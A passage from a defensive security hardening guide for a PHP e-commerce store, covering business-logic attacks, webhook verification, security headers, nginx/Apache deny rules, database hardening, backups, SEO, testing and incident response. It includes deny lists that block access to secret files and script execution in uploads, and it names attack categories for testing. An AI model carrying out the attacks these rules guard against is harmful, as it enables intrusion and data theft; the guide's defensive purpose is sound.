| Phone | Normalize to E.164 (`+92…`) with a pattern check |
| Quantity | Integer 1–max allowed per variant/stock |
| Slug | `^[a-z0-9]+(?:-[a-z0-9]+)*$` |
| Money | Positive decimal with 2 places; never from client for pricing |
| IDs | Positive integers; verify ownership |
| Enum fields (status, sort) | Allow-list |
| Text | Max length; reject control characters; use UTF-8 validation (`mb_check_encoding`) |
| Dates | Real dates (`DateTimeImmutable::createFromFormat` with errors checked) |

- Reject unexpected extra fields in APIs.
- Limit request size and the number of array elements (`max_input_vars`).

---

## 20. Business Logic Attacks (E-Commerce Specific)

These bypass "technical" security by abusing logic. They are common in online stores.

| Attack | Defense |
|--------|---------|
| **Price tampering** (change price in form/JS) | Ignore client prices; compute from DB at checkout |
| **Negative/zero quantity**, huge quantity | Validate integer ≥ 1 and ≤ stock/limit |
| **Coupon abuse** (reuse, stack, brute-force codes) | Server validation, usage limits per user/IP, atomic increment of `used_count`, rate limiting, long random codes |
| **Race conditions** (two buyers buy last item; double-spend coupon) | DB transactions with `SELECT … FOR UPDATE`, unique constraints |
| **Double submit** (duplicate orders) | Idempotency key unique in `orders` |
| **Skipping steps** (jump to "payment success" URL) | Order/payment state machine; confirm payment server-side via gateway API/webhook |
| **Shipping manipulation** | Recalculate from zone/weight server-side |
| **Free shipping / min-order bypass** | Validate again at final step |
| **IDOR on order tracking** | Ownership check or random tracking token |
| **Card testing** (many small tries) | CAPTCHA, rate limit checkout/payment attempts, block IPs, require phone/email verification |
| **Fake COD orders** | Phone verification (OTP), order limits per phone/address, flag suspicious patterns, admin confirmation call |
| **Refund abuse** | Permission + re-auth + audit log + max refund ≤ paid amount |
| **Admin price/stock mistakes** | Activity log with before/after values; approval for bulk changes |
| **Inventory hoarding** (adding all stock to carts) | Reserve stock only at checkout start with short expiry |

### 20.1 Safe checkout transaction pattern

```php
function place_order(array $cartLines, int $customerId, string $idemKey): int {
    $pdo = db();
    $pdo->beginTransaction();
    try {
        // idempotency
        $st = $pdo->prepare('SELECT id FROM orders WHERE idempotency_key = :k');
        $st->execute([':k' => $idemKey]);
        if ($row = $st->fetch()) { $pdo->commit(); return (int)$row['id']; }

        $subtotal = '0.00';
        foreach ($cartLines as $line) {
            // lock stock row
            $st = $pdo->prepare(
                'SELECT v.id, v.price, v.sale_price, i.quantity_on_hand - i.quantity_reserved AS available
                 FROM product_variants v JOIN inventory i ON i.variant_id = v.id
                 WHERE v.id = :id AND v.is_active = 1 FOR UPDATE');
            $st->execute([':id' => $line['variant_id']]);
            $v = $st->fetch();
            if (!$v || $v['available'] < $line['qty']) {
                throw new RuntimeException('Item unavailable.');
            }
            // use DB price, never client price
            // ... compute totals with bcmath, create order_items snapshots, reserve stock ...
        }
        // ... insert order, items, payment record, status history ...
        $pdo->commit();
        return $orderId;
    } catch (Throwable $e) {
        $pdo->rollBack();
        throw $e;
    }
}
```

Use `bcadd/bcmul` or integer paisa to avoid float errors.

---

## 21. Payment and Webhook Security

- **Never** trust a "payment success" redirect or JS callback. Mark orders paid **only** after server-to-server verification (gateway API query) or a **signature-verified webhook**.
- Verify webhook signatures with `hash_equals()`; check timestamp (replay window ≤ 5 min); process each event ID once (idempotency table).
- Match amount, currency and order reference with your DB record before marking paid.
- Use gateway-hosted payment pages/tokenization so **card numbers never touch your server** (keeps you out of heavy PCI scope).
- Never log full card data, CVV, or gateway secrets.
- Whitelist gateway IPs for webhook endpoints where the gateway publishes them.
- Keep API keys in env vars; separate sandbox/production keys.
- Reconcile payments daily (job compares gateway reports with your DB).
- For bank transfer/receipt uploads: validate files (§12), require staff verification, log who verified.

```php
// webhook skeleton
$raw = file_get_contents('php://input');
$sig = $_SERVER['HTTP_X_SIGNATURE'] ?? '';
$expected = hash_hmac('sha256', $raw, getenv('GATEWAY_WEBHOOK_SECRET'));
if (!hash_equals($expected, $sig)) { http_response_code(401); exit; }

$event = json_decode($raw, true, 512, JSON_THROW_ON_ERROR);
// check event id not processed, verify amount/order, then update inside a transaction
```

---

## 22. API Security

- Authenticate every endpoint (session + CSRF for browser; scoped tokens for integrations).
- Authorize each object/action (§11).
- Use `Content-Type: application/json` and reject others on JSON endpoints.
- Rate limit per IP/user/token; stricter for write endpoints.
- Return minimal data (no password hashes, internal notes, costs, other users' info).
- Consistent error format without stack traces: `{"error":"validation_failed","fields":{…}}`.
- Version APIs (`/api/v1/…`).
- Pagination limits (max 100 per page).
- Log requests with IDs; redact sensitive fields.
- CORS: default deny; allow only your own origins (§23).
- API tokens: random 32+ bytes, hashed in DB, scoped, revocable, expiring.

---

## 23. Clickjacking, CORS and Security Headers

### 23.1 Headers to send

```php
<?php
// includes/security.php (headers part)
function send_security_headers(string $nonce): void {
    header_remove('X-Powered-By');
    header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: SAMEORIGIN');
    header('Referrer-Policy: strict-origin-when-cross-origin');
    header('Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(self)');
    header('Cross-Origin-Opener-Policy: same-origin');
    header('Cross-Origin-Resource-Policy: same-site');
    header("Content-Security-Policy: "
        . "default-src 'self'; "
        . "script-src 'self' 'nonce-$nonce' https://challenges.cloudflare.com; "
        . "style-src 'self' 'nonce-$nonce'; "
        . "img-src 'self' data: https:; "
        . "font-src 'self'; "
        . "connect-src 'self'; "
        . "frame-ancestors 'self'; "
        . "form-action 'self'; "
        . "base-uri 'self'; "
        . "object-src 'none'; "
        . "upgrade-insecure-requests");
}

$CSP_NONCE = base64_encode(random_bytes(16));
send_security_headers($CSP_NONCE);
```

Use the nonce in templates: `<script nonce="<?= e($CSP_NONCE) ?>">…</script>`. Avoid `'unsafe-inline'` and `'unsafe-eval'`. Start with `Content-Security-Policy-Report-Only` while tuning, then enforce.

### 23.2 Header meaning

| Header | Protects against |
|--------|------------------|
| HSTS | Downgrade/SSL-strip attacks |
| CSP | XSS, data injection, clickjacking (`frame-ancestors`) |
| X-Content-Type-Options | MIME sniffing of uploads |
| X-Frame-Options | Clickjacking (legacy support) |
| Referrer-Policy | Leaking URLs (tokens, order IDs) to third parties |
| Permissions-Policy | Misuse of browser features |
| COOP/CORP | Cross-origin leaks |

### 23.3 CORS

- Default: **no CORS headers** (same-origin only).
- If needed: reflect only exact allow-listed origins; never `Access-Control-Allow-Origin: *` with credentials.

### 23.4 Cache rules for sensitive pages

```php
header('Cache-Control: no-store, no-cache, must-revalidate, private');
header('Pragma: no-cache');
```

Apply to account, checkout, admin and any page containing personal data.

---

## 24. Bots, Scraping, Spam and DDoS

| Threat | Defense |
|--------|---------|
| Volumetric DDoS | Cloudflare (proxy on, "Under Attack" mode when needed), provider-level protection |
| Layer 7 floods (search, cart, login) | Per-IP/session rate limits, WAF rules, caching |
| Scraping | Rate limits, bot management, don't expose bulk endpoints, robots.txt for polite bots (not security) |
| Spam (reviews, contact, newsletter) | CAPTCHA/Turnstile, honeypot, email verification, moderation queue, link limits |
| Fake accounts | Email verification, rate limits, disposable-email blocklist (optional) |
| Slowloris / slow POST | Web server timeouts, Cloudflare |
| Origin discovery | Allow only Cloudflare IPs to reach the origin; hide the origin IP; do not email from the web server IP |

Search endpoints are expensive: cache popular queries, cap query length (e.g., 80 chars), debounce on the client, require min 2 chars.

---

## 25. Secrets, Encryption and Data Protection

### 25.1 Encryption

- **In transit:** HTTPS only (TLS 1.2+/1.3), HSTS, redirect HTTP→HTTPS, secure internal connections (DB TLS if on another host, Redis TLS/auth).
- **At rest:** Encrypted disks/volumes and encrypted backups. Encrypt sensitive columns (e.g., API tokens, 2FA secrets) with libsodium.

```php
function encrypt_value(string $plain): string {
    $key   = base64_decode(app_key());                   // 32 bytes
    $nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    return base64_encode($nonce . sodium_crypto_secretbox($plain, $nonce, $key));
}
function decrypt_value(string $blob): string|false {
    $key = base64_decode(app_key());
    $raw = base64_decode($blob);
    $nonce = substr($raw, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $cipher = substr($raw, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    return sodium_crypto_secretbox_open($cipher, $nonce, $key);
}
```

- Use `random_bytes()` / `random_int()` for tokens — never `rand()`, `mt_rand()`, `uniqid()`, or `md5(time())`.
- Compare secrets with `hash_equals()`.

### 25.2 Data minimization and privacy

- Collect only what you need; delete what you don't.
- Never store card numbers/CVV.
- Mask personal data in logs (phone, email partially).
- Customer data export and deletion workflow; retention policy for old guest data and logs.
- Restrict who can export customer lists; log every export.
- Show only necessary data in admin lists; reveal full details on demand.

---

## 26. Dependencies and Supply Chain

- Use **Composer** with a lock file committed; install with `composer install --no-dev --optimize-autoloader` in production.
- Run `composer audit` in CI and weekly.
- Keep a small set of well-known libraries (PHPMailer, Dompdf, PhpSpreadsheet, HTMLPurifier, Monolog).
- Pin versions; review changelogs; subscribe to security advisories.
- Don't load random third-party JS (chat widgets, trackers) without review; use **Subresource Integrity (SRI)** for any external script and restrict via CSP. Prefer self-hosting libraries (Chart.js, SweetAlert2).
- Remove unused packages and abandoned libraries.
- Verify downloads/checksums for any manually installed code. Never install "nulled" (pirated) themes/plugins — they carry backdoors.
- Update OS, PHP, web server, MySQL, Redis regularly (automated security updates).

---

## 27. Server, Web Server and Network Hardening

### 27.1 Nginx example

```nginx
server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://example.com$request_uri;
}

# Catch-all: reject unknown Host headers
server {
    listen 443 ssl default_server;
    ssl_reject_handshake on;
}

server {
    listen 443 ssl http2;
    server_name example.com;
    root /var/www/embroidery-store/public;
    index index.php;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    server_tokens off;

    client_max_body_size 10m;
    client_body_timeout 15s;
    client_header_timeout 15s;
    send_timeout 15s;
    keepalive_timeout 15s;

    # Block hidden files and sensitive extensions
    location ~ /\.(?!well-known) { deny all; }
    location ~* \.(env|ini|log|sql|bak|old|orig|swp|zip|tar|gz|7z|git|yml|yaml|lock|md)$ { deny all; }

    # NO PHP execution in uploads
    location ^~ /uploads/ {
        location ~ \.(php|phtml|phar|pl|py|cgi|sh)$ { return 403; }
        add_header X-Content-Type-Options nosniff always;
        expires 1y;
        add_header Cache-Control "public, immutable";
        try_files $uri =404;
    }

    # Static assets: long cache
    location ^~ /assets/ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        try_files $uri =404;
    }

    # Clean URLs
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    # Only index.php is executed
    location = /index.php {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.3-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_read_timeout 30s;
    }

    location ~ \.php$ { return 404; }   # block direct execution of any other PHP file in public/
}
```

If the admin has its own entry point, define a separate `location ^~ /admin/` that allows execution only for the admin front controller, and optionally restricts by IP/Cloudflare Access.

### 27.2 Apache `.htaccess` (if Apache is used)

```apache
Options -Indexes -MultiViews
ServerSignature Off

<FilesMatch "^\.|\.(env|ini|log|sql|bak|old|orig|swp|lock|yml|yaml|md)$">
    Require all denied
</FilesMatch>

# No PHP in uploads
<Directory "/var/www/embroidery-store/public/uploads">
    php_flag engine off
    RemoveHandler .php .phtml .phar
    <FilesMatch "\.(php|phtml|phar)$">
        Require all denied
    </FilesMatch>
</Directory>

RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^ index.php [L]
```

### 27.3 Operating system and network

- Firewall (UFW/security groups): open only 80/443 publicly; SSH restricted by IP/VPN; DB and Redis **not publicly reachable** (bind to private interface/localhost).
- SSH: key-only authentication, disable root login and password login, non-default user, fail2ban/CrowdSec.
- Automatic security updates (`unattended-upgrades`).
- Correct file permissions: code owned by deploy user, read-only to the PHP-FPM user; writable only for `storage/` and `public/uploads/`. Typical: directories `755`, files `644`, secrets `600`.
- No FTP; use SFTP/SSH deployments via CI.
- Separate staging from production; staging protected with auth and not indexed.
- Disable directory listing everywhere.
- Intrusion detection / file-integrity monitoring (e.g., AIDE, Wazuh, or Imunify360 on hosting).
- Time sync (NTP) for correct logs and token expiry.

---

## 28. Database Server Hardening

```sql
-- Application user: minimal rights, only from the app host
CREATE USER 'emb_app'@'10.0.0.%' IDENTIFIED BY '<long-random>';
GRANT SELECT, INSERT, UPDATE, DELETE ON embroidery.* TO 'emb_app'@'10.0.0.%';

-- Migration user used only during deployments
CREATE USER 'emb_migrate'@'10.0.0.5' IDENTIFIED BY '<long-random>';
GRANT ALL PRIVILEGES ON embroidery.* TO 'emb_migrate'@'10.0.0.5';

-- Read-only reporting user (replica)
CREATE USER 'emb_report'@'10.0.0.%' IDENTIFIED BY '<long-random>';
GRANT SELECT ON embroidery.* TO 'emb_report'@'10.0.0.%';
```

- Remove anonymous users and the `test` database; disable remote root.
- Disable `LOAD DATA LOCAL INFILE` (`local_infile=0`) and `FILE` privilege.
- Bind to private IP; require TLS between app and DB if over a network.
- `sql_mode` strict (`STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION,ONLY_FULL_GROUP_BY`).
- Enable slow query log; review and index.
- Encrypted backups; restricted access to dumps.
- Redis: `requirepass` (or ACLs), bind to private interface, disable dangerous commands (`FLUSHALL`, `CONFIG`, `KEYS` in prod where possible), never expose to the internet.

---

## 29. Logging, Monitoring and Alerting

### 29.1 What to log

| Event | Details |
|-------|---------|
| Authentication | Success, failure, lockout, 2FA, password changes, resets |
| Authorization | Denied requests, role changes |
| Admin actions | Who changed what (before/after), exports, refunds, price/stock edits, settings |
| Orders & payments | Status changes, webhook events, verification results |
| Security events | CSRF failures, rate-limit hits, WAF blocks, suspicious uploads |
| Errors | PHP exceptions, DB errors, failed jobs |

### 29.2 Log hygiene

- Structured logs (JSON) with timestamp (UTC), request ID, user ID, IP, route.
- **Never log** passwords, tokens, full card numbers, session IDs.
- Protect logs from tampering (append-only, restricted permissions, ship to a central/off-server place).
- Rotate and retain (e.g., 90 days security logs; longer for financial audit trail as law requires).

### 29.3 Alerts

Alert the owner/dev by email/WhatsApp/Slack on:

- Many failed logins; new admin created; role change.
- Admin login from a new country/device.
- Spike in 4xx/5xx, WAF blocks or traffic.
- Unexpected file changes in code directories.
- Large data export; mass price changes.
- Failed backups; queue backlog; disk nearly full.
- SSL certificate expiry; uptime failures.

---

## 30. Backups and Disaster Recovery

- **3-2-1 rule:** 3 copies, 2 different media/locations, 1 off-site (and ideally one immutable/offline).
- Daily database backups (plus binary logs for point-in-time recovery); weekly full file backups; keep uploads in object storage with versioning.
- **Encrypt** backups; store keys separately.
- Backup user and storage credentials must not allow deletion from the production server (ransomware protection).
- **Test restores** monthly; document RTO (recovery time) and RPO (data-loss window).
- Keep a documented runbook: how to restore, how to rotate secrets, how to redeploy clean code.

---

## 31. Performance Practices That Also Improve Security

Speed and security support each other: faster pages need less server work, so floods and slow-request attacks hurt less.

| Practice | Speed benefit | Security benefit |
|----------|---------------|------------------|
| OPcache + JIT, PHP-FPM tuning | Faster execution | Handles more load before failing |
| Cloudflare CDN + caching | Lower latency, offloaded origin | DDoS/WAF protection, hides origin |
| Full-page cache for anonymous pages | Very fast catalog | Absorbs bot/scraper traffic |
| Redis cache (menus, categories, settings) | Fewer DB queries | Less DB exposure under load |
| Pagination and query limits | Smaller responses | Prevents data-dump abuse |
| Proper DB indexes | Fast queries | Stops slow-query DoS |
| WebP/AVIF, `srcset`, lazy-loading | Smaller pages | Re-encoding strips malicious payloads |
| HTTP/2 or HTTP/3, Brotli | Faster transfer | Modern TLS by default |
| Self-hosted assets, minified CSS/JS | Fewer requests | Fewer third-party risks, stricter CSP |
| Queue background jobs (emails, PDFs) | Quick responses | Limits request time/DoS surface |
| Request timeouts and size limits | — | Prevents resource exhaustion |
| Fingerprinted asset URLs (`app.4f2c1.css`) | Immutable long-term caching | Easy safe cache busting |

**Caching rules (important for security):**

- Cache **only** public, anonymous pages. Never cache pages with personal data, cart contents, CSRF tokens, or admin screens. Use `Cache-Control: private/no-store` for them and make sure the CDN honours that.
- Vary cache keys correctly (language, currency) to avoid cache poisoning/leaks.
- Don't include user-specific tokens in cached HTML; load them via a small non-cached request if needed.

**Example caching headers**

```
Static assets/images:  Cache-Control: public, max-age=31536000, immutable
Public HTML:           Cache-Control: public, max-age=300, s-maxage=3600, stale-while-revalidate=86400
Account/checkout/admin: Cache-Control: no-store, private
```

---

## 32. SEO-Friendly Security

Security done wrong can hurt rankings; security done right protects them. Hacked sites get "This site may be hacked" warnings, blacklisted by Google Safe Browsing and flooded with spam pages.

### 32.1 Security choices that help SEO

| Practice | SEO impact |
|----------|------------|
| HTTPS everywhere + HSTS | Ranking signal, trust, required for modern features |
| One canonical host (`example.com` **or** `www`) with 301 redirects | Prevents duplicate content |
| Fast pages (caching, CDN, image optimization) | Core Web Vitals improve rankings |
| No malware/spam injection | Avoids penalties and blacklisting |
| Clean, stable URLs and 301 redirect manager | Preserves link equity |
| Proper `404`/`410` for removed items, real `500` for errors | Correct crawl signals |
| Mobile-first, responsive design | Google uses mobile-first indexing |
| Structured data (Product, Offer, Review, Breadcrumb) | Rich results; escape JSON-LD safely |
| Secure, accessible markup | Better crawlability |

### 32.2 Things to avoid (security that breaks SEO)

- **Do not block Googlebot/Bingbot** with aggressive rate limits or CAPTCHAs. Verify real search bots by reverse-DNS + forward-DNS confirmation (or Cloudflare's verified bot flag) and allow them through.
- Do not put important content behind login or JS-only rendering.
- Do not return `403`/`503` for normal crawlers during WAF challenges; use `429` with `Retry-After` only for real abuse.
- Do not use `X-Robots-Tag: noindex` on public pages by mistake; **do** use `noindex` on admin, account, cart, checkout, search-result and staging pages.
- Do not use CSP/other headers that break page rendering for crawlers (test with Google's URL Inspection / Rich Results Test).
- Avoid "security through obscurity" redirects that create redirect chains.

### 32.3 `robots.txt` and meta robots

```
User-agent: *
Disallow: /admin/
Disallow: /account/
Disallow: /cart
Disallow: /checkout
Disallow: /api/
Disallow: /search?
Allow: /

Sitemap: https://example.com/sitemap.xml
```

`robots.txt` is **not security** — it's public. Protect admin with authentication; additionally send `X-Robots-Tag: noindex, nofollow` and `<meta name="robots" content="noindex">` on private areas.

### 32.4 Structured data (safe output)

```php
<script type="application/ld+json" nonce="<?= e($CSP_NONCE) ?>">
<?= json_encode([
  '@context' => 'https://schema.org',
  '@type'    => 'Product',
  'name'     => $product['name'],
  'sku'      => $product['sku'],
  'image'    => $images,
  'offers'   => [
      '@type' => 'Offer',
      'priceCurrency' => 'PKR',
      'price' => $product['price'],
      'availability' => $inStock ? 'https://schema.org/InStock' : 'https://schema.org/OutOfStock',
      'url' => $canonicalUrl,
  ],
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP) ?>
</script>
```

### 32.5 Canonical, redirect and HTTP status rules

```php
// force canonical host & https (config-driven, not from user Host header)
$canonicalHost = parse_url(APP_URL, PHP_URL_HOST);
if (($_SERVER['HTTP_HOST'] ?? '') !== $canonicalHost || !is_https()) {
    header('Location: ' . APP_URL . $_SERVER['REQUEST_URI'], true, 301);
    exit;
}
```

- Discontinued products: keep the page with "unavailable" or 301 to the category; `410` when permanently gone.
- Add `<link rel="canonical">` on every indexable page; handle filter/sort parameters with canonical to the clean URL.
- Provide `sitemap.xml` (products, categories, collections, pages) with `lastmod`.

### 32.6 SEO spam / hacked-site monitoring

- Monitor Google Search Console "Security issues" and "Manual actions".
- Alert on new/changed PHP files, new `.htaccess` rules, unknown admin users, unexpected outbound links in pages.
- Regularly search `site:yourdomain.com viagra|casino|loan` to detect injected spam pages.
- File integrity monitoring on `public/`, `modules/`, `includes/`.
- Moderate user-generated content (reviews) with `rel="nofollow ugc noopener"` on user-provided links; ideally strip links.

---

## 33. Secure Development Workflow

### 33.1 Coding standards

- `declare(strict_types=1);` in every PHP file.
- No raw `$_GET/$_POST` use in business code — go through a validated request/input layer.
- One place for each security function (CSRF, escaping, auth, permissions) — no copy-pasted variants.
- Code review required for anything touching auth, payments, permissions, uploads, SQL.
- No debug code, `var_dump`, test accounts, default passwords or commented secrets in commits.
- Prefer composition of small, tested functions over giant scripts.

### 33.2 Git and CI/CD

- Protected `main` branch; pull requests with review.
- Secret scanning (gitleaks) in CI; if a secret leaks, **rotate it** (don't just delete the commit).
- CI pipeline: lint → PHPStan/Psalm → unit tests → `composer audit` → build assets → deploy to staging → smoke tests → deploy to production.
- Deploy from CI via SSH/rsync or artifacts; no manual edits on production servers.
- Database migrations versioned and reviewed; backup before migrate.
- Use feature flags for risky releases; keep a rollback procedure.

### 33.3 Developer security checklist per feature

- [ ] Who is allowed to do this? (permission check implemented server-side)
- [ ] Is every input validated (type, length, range, allow-list)?
- [ ] Are all queries prepared statements?
- [ ] Is all output escaped for its context?
- [ ] CSRF protection on state changes?
- [ ] Ownership check for every object ID?
- [ ] Rate limiting/abuse protection needed?
- [ ] Money/stock logic server-side and in a transaction?
- [ ] Logged (audit trail) if sensitive?
- [ ] Error handling doesn't leak details?
- [ ] Tested on mobile and with malicious inputs?

---

## 34. Security Testing

| Type | Tools / Method | Frequency |
|------|----------------|-----------|
| Static analysis | PHPStan/Psalm (max level), Semgrep with PHP rules, PHPCS security rules | Every commit |
| Dependency audit | `composer audit`, Dependabot/Renovate | Every build + weekly |
| Secret scanning | gitleaks / trufflehog | Every commit |
| Unit/integration tests | PHPUnit — pricing, discounts, permissions, checkout concurrency | Every commit |
| DAST scanning | OWASP ZAP baseline scan against staging | Each release |
| Manual security review | Auth, payments, uploads, admin permissions | Each major feature |
| Penetration test | Independent tester | Before launch and yearly |
| SSL/TLS & headers check | SSL Labs, securityheaders.com, Mozilla Observatory | Monthly / after changes |
| Load testing | k6 / JMeter | Before launch and big campaigns |
| Backup restore drill | Real restore on staging | Monthly |
| Access review | Remove unused admin accounts/tokens | Quarterly |

**Targets:** SSL Labs grade A/A+, Security Headers grade A, zero high/critical findings from the pre-launch pen test.

**Test cases to always include:** SQL injection strings in every field, XSS payloads in names/reviews/addresses, IDOR attempts between two customers, admin endpoints with a low-privilege user, CSRF with a forged form, negative quantities/prices, duplicate submit, race on last stock item, upload of `.php`/double extensions/polyglots, expired/reused reset tokens, forged webhook signatures.

---

## 35. Incident Response Plan

1. **Detect** — alert, customer report, anomaly, Search Console warning.
2. **Contain** — enable Cloudflare "Under Attack"/maintenance mode, block IPs, disable the affected feature, revoke compromised sessions/tokens/keys.
3. **Preserve evidence** — snapshot server/disk, copy logs before cleaning.
4. **Eradicate** — find root cause; remove backdoors/web shells (compare against clean Git/deploy artifacts); patch the vulnerability; rotate **all** secrets (DB, API, app key, SSH, admin passwords).
5. **Recover** — redeploy from clean source; restore data from verified backup if needed; monitor closely.
6. **Notify** — affected customers and authorities if personal data was exposed (follow applicable law and payment provider rules); inform payment gateway/courier partners if relevant.
7. **Review** — post-incident report: timeline, cause, fixes, prevention actions; update this document and tests.

Keep an up-to-date list of emergency contacts (developer, host, Cloudflare, payment gateway) and the location of credentials in a secure password manager.

---

## 36. Pre-Launch Security Checklist

**Application**
- [ ] All DB access through PDO prepared statements; dynamic identifiers whitelisted
- [ ] All output escaped by context; rich text sanitized with HTMLPurifier
- [ ] CSRF tokens on all state-changing forms and AJAX
- [ ] Sessions: secure cookie flags, regeneration, timeouts, admin separate
- [ ] Passwords hashed with Argon2id/bcrypt; reset tokens hashed & expiring
- [ ] Login/reset/registration/checkout rate limited; CAPTCHA configured
- [ ] RBAC enforced on every admin route & API; IDOR tests pass
- [ ] Uploads: allow-list, re-encoded, random names, no execution
- [ ] No unsafe `include`, `unserialize`, `eval`, shell commands
- [ ] Prices, discounts, shipping, stock computed server-side in transactions
- [ ] Payment webhooks signature-verified and idempotent
- [ ] Errors hidden from users; detailed errors logged privately
- [ ] Security headers + CSP active (report-only phase completed)
- [ ] 2FA enabled for admin accounts

**Infrastructure**
- [ ] Only `public/` is web root; no `.env`, `.git`, backups, SQL files exposed
- [ ] PHP execution blocked in uploads; directory listing off
- [ ] HTTPS with HSTS; HTTP→HTTPS redirect; A/A+ SSL grade
- [ ] Firewall: DB/Redis private; SSH key-only; fail2ban active
- [ ] OS, PHP, MySQL, Redis, Composer packages updated
- [ ] DB users least-privilege; root remote access disabled
- [ ] Cloudflare proxy + WAF + rate limiting; origin locked to Cloudflare IPs
- [ ] Automated, encrypted, off-site backups; restore tested
- [ ] Logging and alerting in place; log retention configured
- [ ] Staging protected and noindex

**Performance & SEO**
- [ ] OPcache enabled; Redis caching; CDN caching rules verified
- [ ] Images optimized (WebP/AVIF, responsive, lazy)
- [ ] Core Web Vitals pass on mobile (LCP ≤ 2.5 s, CLS ≤ 0.1, INP ≤ 200 ms)
- [ ] Canonical host/HTTPS redirects; canonical tags; sitemap.xml; robots.txt
- [ ] Private pages `noindex`; public pages indexable; search bots not blocked
- [ ] Structured data valid in Rich Results Test
- [ ] Search Console and security-issue monitoring set up

**Process**
- [ ] Pen test completed; findings fixed
- [ ] Incident response plan and contact list ready
- [ ] Admin accounts reviewed; default accounts removed
- [ ] Privacy policy, terms and data handling documented

---

## 37. Attack → Defense Quick Reference

| Attack | Short description | Main defenses (section) |
|--------|-------------------|--------------------------|
| SQL Injection | Malicious SQL via input | PDO prepared statements, whitelists, least-privilege DB (§5, §28) |
| Stored/Reflected/DOM XSS | Script injected into pages | Context escaping, HTMLPurifier, CSP, HttpOnly (§6, §23) |
| CSRF | Forged actions by logged-in users | Tokens, SameSite, origin check, re-auth (§7) |
| Session hijacking/fixation | Stolen/forced session IDs | Secure cookies, regenerate ID, HTTPS, timeouts (§8) |
| Brute force / credential stuffing | Password guessing | Rate limits, lockouts, CAPTCHA, 2FA, breach-password check (§9, §10) |
| IDOR / broken access control | Accessing others' data | Ownership checks, RBAC, random tokens (§11) |
| Privilege escalation | Gaining higher role | Server-side permissions, no role from client (§11, §19) |
| Malicious file upload / web shell | Executable file uploaded | Allow-list, re-encode, random names, no-exec dir (§12) |
| Path traversal / LFI / RFI | Reading/including arbitrary files | Allow-list, `realpath`, `allow_url_include=Off`, `open_basedir` (§13) |
| Command injection / RCE | Running OS commands | No shell calls, `disable_functions`, `escapeshellarg` (§14) |
| Insecure deserialization | Object injection via `unserialize` | JSON, signed data, `allowed_classes=false` (§15) |
| SSRF | Server makes internal requests | URL allow-list, block private IPs, firewall (§16) |
| Open redirect | Phishing via redirect param | Relative-path-only redirects (§16) |
| Email/header injection | CRLF in headers/emails | Strip newlines, PHPMailer, validation (§17) |
| Host header attack | Poisoned reset links/cache | Config-based base URL, server host allow-list (§17) |
| XXE | XML external entities | Disable entities/DTDs, avoid XML (§18) |
| Mass assignment | Overwriting protected fields | Explicit field allow-lists (§19) |
| Price/quantity tampering | Changing price in request | Server-side pricing, validation (§20) |
| Coupon abuse / race conditions | Reusing/stacking, parallel requests | Atomic updates, transactions, limits (§20) |
| Card testing / fake COD | Fraud automation | CAPTCHA, OTP, rate limits, fraud flags (§20, §24) |
| Payment forgery | Fake "payment success" | Signed webhooks, server verification (§21) |
| Clickjacking | Hidden iframe overlays | CSP `frame-ancestors`, X-Frame-Options (§23) |
| CORS misconfiguration | Cross-origin data theft | Default deny, exact origin allow-list (§23) |
| DDoS / bot floods | Resource exhaustion | Cloudflare, rate limits, caching, timeouts (§24, §31) |
| Scraping | Mass data harvesting | Rate limits, bot rules, pagination limits (§24) |
| MITM / SSL strip | Traffic interception | HTTPS, HSTS, TLS 1.2+ (§23, §27) |
| Information disclosure | Leaked errors, files, versions | Hide errors, `expose_php=Off`, deny sensitive files (§4, §27) |
| Vulnerable dependencies | Known CVEs in libraries | Composer audit, updates, minimal packages (§26) |
| Supply-chain / nulled plugins | Backdoored third-party code | Trusted sources, SRI, review, lockfile (§26) |
| Brute-force of tokens/IDs | Guessing reset/order tokens | 256-bit random tokens, expiry, hashing (§9, §11) |
| Timing attacks | Inferring secrets by response time | `hash_equals`, constant-time flow (§9, §25) |
| Weak randomness | Predictable tokens | `random_bytes`/`random_int` only (§25) |
| Defacement / SEO spam injection | Malicious page/content changes | File integrity monitoring, least privilege, backups, GSC alerts (§27, §29, §32) |
| Insider misuse | Staff abusing access | RBAC, audit logs, re-auth, export alerts (§11, §29) |
| Ransomware / data loss | Encrypted/deleted data | Immutable off-site backups, restore drills (§30) |

---

## 38. Helper Code Library (copy-ready)

### 38.1 `includes/security.php` (consolidated)

```php
<?php
declare(strict_types=1);

// ---- Session ----
function start_secure_session(string $name = '__Host-ESID'): void {
    if (session_status() === PHP_SESSION_ACTIVE) return;
    session_name($name);
    session_set_cookie_params([
        'lifetime' => 0, 'path' => '/', 'secure' => true,
        'httponly' => true, 'samesite' => 'Lax',
    ]);
    session_start();
}

// ---- Client IP (trust Cloudflare header ONLY when request is from Cloudflare) ----
function client_ip(array $cloudflareCidrs = []): string {
    $remote = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP']) && ip_in_cidrs($remote, $cloudflareCidrs)) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    return $remote;
}

// ---- Safe abort ----
function abort(int $code = 404, string $msg = 'Not found'): never {
    http_response_code($code);
    exit(e($msg));
}

// ---- Constant-time string compare wrapper ----
function secure_equals(string $a, string $b): bool {
    return hash_equals($a, $b);
}

// ---- Token generation ----
function random_token(int $bytes = 32): string {
    return bin2hex(random_bytes($bytes));
}

// ---- Audit log ----
function audit(string $action, ?string $entity = null, ?int $entityId = null, ?array $before = null, ?array $after = null): void {
